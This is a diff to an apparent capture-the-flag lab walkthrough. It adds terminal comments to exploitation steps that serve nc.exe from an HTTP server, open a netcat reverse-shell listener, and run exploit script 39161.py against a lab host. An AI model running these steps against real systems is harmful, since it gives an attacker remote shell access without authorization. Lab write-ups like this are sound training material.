@@ -44,12 +44,16 @@ Change ip addres and port number:
 
 ## Exploitation & Gaining Access
 ```
+# On the kali attack vm:
 cp /usr/share/windows-binaries/nc.exe .
 
+# On the kali attack vm - different terminal:
 sudo python3 -m http.server 80
 
+# On the kali attack vm - different terminal you will get the revershell:
 nc -nlvp 4444
 
+# On the kali attack vm - different terminal:
 python3 39161.py 10.10.10.8 80
 
 python3 39161.py 10.10.10.8 80
